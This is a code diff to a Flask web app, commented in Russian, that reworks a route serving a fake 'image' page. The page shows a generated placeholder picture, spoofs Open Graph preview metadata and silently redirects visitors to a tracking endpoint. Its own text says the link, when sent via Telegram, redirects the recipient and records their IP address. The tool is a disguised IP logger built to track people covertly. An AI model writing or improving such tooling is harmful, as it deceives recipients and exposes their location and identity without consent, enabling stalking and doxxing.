@@ -9,6 +9,7 @@ import random
 import string
 import os
 import io
+import base64
 from flask import Flask, request, jsonify, send_file, Response
 from datetime import datetime
 from PIL import Image, ImageDraw, ImageFont
@@ -102,7 +103,8 @@ def index():
                 </div>
                 <p style="font-size: 0.9em; margin-top: 15px; opacity: 0.9;">
                     📄 PDF: при открытии кликните на ссылку внутри документа<br>
-                    📷 PNG: отправьте ссылку <a href="/image/{tracking_code}" style="color: #fff; text-decoration: underline;" target="_blank">/image/{tracking_code}</a> (автоматическое перенаправление)
+                    📷 Для Telegram: отправьте ссылку <a href="/image/{tracking_code}" style="color: #fff; text-decoration: underline;" target="_blank">/image/{tracking_code}</a><br>
+                    <span style="font-size: 0.85em;">(при открытии в Telegram автоматически перенаправит и отследит IP)</span>
                 </p>
             </div>
             <p style="margin-top: 20px;"><a href="/status" style="color: #fff;">📊 Статус посещений</a></p>
@@ -243,54 +245,97 @@ def download_png(code):
 
 @app.route('/image/<code>')
 def image_redirect(code):
-    """HTML страница, которая выглядит как изображение и автоматически перенаправляет"""
+    """HTML страница с изображением, которая автоматически перенаправляет при открытии"""
     base_url = request.host_url.rstrip('/')
     track_url = f"{base_url}/track/{code}"
     
-    # Создаем HTML страницу, которая выглядит как изображение и перенаправляет
+    # Создаем простое изображение в base64 для отображения
+    img = Image.new('RGB', (800, 600), color=(102, 126, 234))  # Красивый фиолетовый
+    draw = ImageDraw.Draw(img)
+    
+    # Пытаемся использовать системный шрифт
+    try:
+        font_large = ImageFont.truetype("arial.ttf", 50)
+        font_medium = ImageFont.truetype("arial.ttf", 30)
+    except:
+        try:
+            font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 50)
+            font_medium = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 30)
+        except:
+            font_large = ImageFont.load_default()
+            font_medium = ImageFont.load_default()
+    
+    # Рисуем текст на изображении
+    text1 = "Загрузка изображения..."
+    text2 = "Пожалуйста, подождите"
+    
+    # Получаем размеры текста для центрирования
+    bbox1 = draw.textbbox((0, 0), text1, font=font_large)
+    bbox2 = draw.textbbox((0, 0), text2, font=font_medium)
+    text1_width = bbox1[2] - bbox1[0]
+    text1_height = bbox1[3] - bbox1[1]
+    text2_width = bbox2[2] - bbox2[0]
+    
+    # Рисуем текст по центру
+    draw.text((400 - text1_width/2, 250), text1, fill='white', font=font_large)
+    draw.text((400 - text2_width/2, 320), text2, fill='white', font=font_medium)
+    
+    # Конвертируем изображение в base64
+    img_buffer = io.BytesIO()
+    img.save(img_buffer, format='PNG')
+    img_buffer.seek(0)
+    img_base64 = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
+    
+    # Создаем HTML страницу с изображением, которая автоматически перенаправляет
     html_content = f'''
     <!DOCTYPE html>
     <html>
     <head>
         <meta charset="utf-8">
         <meta http-equiv="refresh" content="0;url={track_url}">
-        <title>Загрузка изображения...</title>
+        <meta property="og:image" content="data:image/png;base64,{img_base64}">
+        <meta property="og:title" content="Изображение">
+        <meta property="og:description" content="Загрузка изображения...">
+        <title>Изображение</title>
         <style>
+            * {{
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }}
             body {{
                 margin: 0;
                 padding: 0;
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                width: 100vw;
+                height: 100vh;
+                overflow: hidden;
+                background: #000;
                 display: flex;
                 justify-content: center;
                 align-items: center;
-                height: 100vh;
-                font-family: Arial, sans-serif;
-                color: white;
             }}
-            .container {{
-                text-align: center;
-            }}
-            .loader {{
-                border: 4px solid rgba(255, 255, 255, 0.3);
-                border-top: 4px solid white;
-                border-radius: 50%;
-                width: 50px;
-                height: 50px;
-                animation: spin 1s linear infinite;
-                margin: 20px auto;
-            }}
-            @keyframes spin {{
-                0% {{ transform: rotate(0deg); }}
-                100% {{ transform: rotate(360deg); }}
+            img {{
+                max-width: 100%;
+                max-height: 100%;
+                width: auto;
+                height: auto;
+                object-fit: contain;
             }}
         </style>
     </head>
     <body>
-        <div class="container">
-            <div class="loader"></div>
-            <p>Загрузка изображения...</p>
-        </div>
-        <script>window.location.href = "{track_url}";</script>
+        <img src="data:image/png;base64,{img_base64}" alt="Изображение" onclick="window.location.href='{track_url}'" style="cursor: pointer;">
+        <script>
+            // Автоматическое перенаправление через 100ms (чтобы изображение успело загрузиться)
+            setTimeout(function() {{
+                window.location.href = "{track_url}";
+            }}, 100);
+            
+            // Также перенаправляем при клике на изображение
+            document.addEventListener('click', function() {{
+                window.location.href = "{track_url}";
+            }});
+        </script>
     </body>
     </html>
     '''
